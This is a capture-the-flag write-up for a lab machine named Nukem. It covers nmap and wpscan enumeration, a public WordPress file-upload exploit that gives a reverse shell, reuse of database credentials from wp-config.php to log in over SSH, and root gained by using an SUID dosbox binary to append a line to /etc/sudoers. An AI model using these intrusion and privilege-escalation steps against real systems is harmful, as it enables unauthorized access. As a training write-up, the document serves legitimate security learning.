First Enumeration with nmap

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn <IP>`

```
# Nmap 7.93 scan initiated Thu Jan  5 09:31:45 2023 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.79.105
Nmap scan report for 192.168.79.105
Host is up (0.17s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3306/tcp  open  mysql
5000/tcp  open  upnp
13000/tcp open  unknown
36445/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Jan  5 09:32:33 2023 -- 1 IP address (1 host up) scanned in 48.49 seconds
```

Now we know what ports are open, let's run default nmap scripts to know what services are running on those ports.

```
# Nmap 7.93 scan initiated Thu Jan  5 09:36:51 2023 as: nmap -sC -sV -oN normal.tcp -p 22,80,3306,5000,13000,36445 -Pn 192.168.79.105
Nmap scan report for 192.168.79.105
Host is up (0.18s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e6af5d330087aec3828a0884d75da19 (RSA)
|   256 433bb5bf938668e9d5759c7d26945581 (ECDSA)
|_  256 e3f71caecd91c128a33a5bf63eda3f58 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-generator: WordPress 5.5.1
3306/tcp  open  mysql?
| fingerprint-strings: 
|   LDAPBindReq, NULL, WMSRequest: 
|_    Host '192.168.49.79' is not allowed to connect to this MariaDB server
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-title: 404 Not Found
13000/tcp open  http        nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Login V14
36445/tcp open  netbios-ssn Samba smbd 4.6.2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=1/5%Time=63B68C24%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.79'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPBindReq
SF:,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.79'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(WMSRequest,4
SF:C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.79'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan  5 09:38:00 2023 -- 1 IP address (1 host up) scanned in 69.63 seconds
```

cool we now know what services are running on those ports. Let's start enumeration with port 80.

![image](https://user-images.githubusercontent.com/87468669/210872594-2bab72f0-cb2b-49fc-ac91-67a3649d2f34.png)

Nice, seems the web service is running a wordpress cms, let's enumerate wordpress using wpscan to enumerate plugins, themes and users.

`wpscan --url http://192.168.79.105/ --enumerate p,t,u`

![image](https://user-images.githubusercontent.com/87468669/210873558-0652681b-9984-45cd-bf0c-0dad13e19edb.png)

Nice we got available plugins `simple file list` & `tutor`. Let's chck online for public exploit.

![image](https://user-images.githubusercontent.com/87468669/210874945-ba84831b-6add-4bf3-99aa-9aa0b9bf12a5.png)

Found a public exploit on exploitdb. This exploit let's us execute an arbitary file upload and get a reverse shell. Let's download and edit the exploit.

![image](https://user-images.githubusercontent.com/87468669/210876463-f3e7355d-24d6-472e-9df9-8ed1f3108898.png)

cool, ran the exploit and got a reverse shell, stabilize the shell and escalate privs.

![image](https://user-images.githubusercontent.com/87468669/210881849-e6834e9a-a559-4a08-8a7d-85a6d194fc96.png)

Found some mysql creds in the wp-config.php file in the /src/http dir.

```                                                                                                                                                 
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Nukem]
└─$ ssh commander@192.168.79.105                       
commander@192.168.79.105's password: 
[commander@nukem ~]$ id
uid=1000(commander) gid=1000(commander) groups=1000(commander)
[commander@nukem ~]$ whoai 
-bash: whoai: command not found
[commander@nukem ~]$ whoami
commander
[commander@nukem ~]$ sudo -l
[sudo] password for commander: 
Sorry, user commander may not run sudo on nukem.
[commander@nukem ~]$ 
```

I tried using thos creds to login ssh and it worked. I did `sudo -l` the user commander is not in the sudoers file. Let's esclate privs further.

![image](https://user-images.githubusercontent.com/87468669/210884681-285dfa97-e1f0-4df8-bf81-8031d2aed063.png)

Doing `netstat -ano` I found a service running on port 5901 as local host. 

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Nukem]
└─$ ssh -L 5901:127.0.0.1:5901 commander@192.168.79.105
commander@192.168.79.105's password: 
Last login: Thu Jan  5 21:28:07 2023 from 192.168.49.79
[commander@nukem ~]$ ls
Desktop  local.txt  python_rest_flask
[commander@nukem ~]$ 
```

I did forwarded the port 5901 to my local machine using ssh. now let's check for suid on the target box.

![image](https://user-images.githubusercontent.com/87468669/210887764-8a3bf25a-0d55-4435-8a2e-3934b08e9152.png)

Got an suid `dosbox`. DOSBox is a free and open-source emulator which runs software for MS-DOS compatible disk operating systems—primarily video games. It was first released in 2002, when DOS technology was becoming obsolete. Its adoption for running DOS games is widespread, with it being used in commercial re-releases of those games as well. DOSBox can be downloaded and used from the video game console emulator front-end RetroArch. 
dosbox is a gui application. remembered we port forwarded a vnc port to our local host. Let's check it out.

`vncviewer 127.0.0.1:5901`

![image](https://user-images.githubusercontent.com/87468669/210889168-48d243a1-d39a-4134-bfc6-993c3a8be800.png)

We got a vnc session using the password we found earlier. now let's start the dosbox

![image](https://user-images.githubusercontent.com/87468669/210890886-040ee5d6-7bf5-452d-b191-a915782a2df8.png)

Now we've started dosbox. So dosbox is a kinda emulator,  so you're running the dos operating system. so you'll need to mount the files we need.

```
mount C: / to mount the / dir
C:/ to switch to the mount dir
```

![image](https://user-images.githubusercontent.com/87468669/210891444-9a05df59-e5d4-4df8-a102-790354250625.png)

now that we've mounted the c drive to etc we can read the shadow file type shadow and since we have read/write permissions we should be able to write our user to the /etc/sudoers file

`echo commander ALL=(ALL) ALL >>sudoers`.

![image](https://user-images.githubusercontent.com/87468669/210892143-90503eee-f334-4f51-9da5-62e71f8e5e5c.png)

and back in our shell we should be able to upgrade out session with sudo -l and enter the password.

![image](https://user-images.githubusercontent.com/87468669/210892371-73acd67b-1ae1-4221-a490-4e1d24ebb57e.png)

Boom! we got root🤠



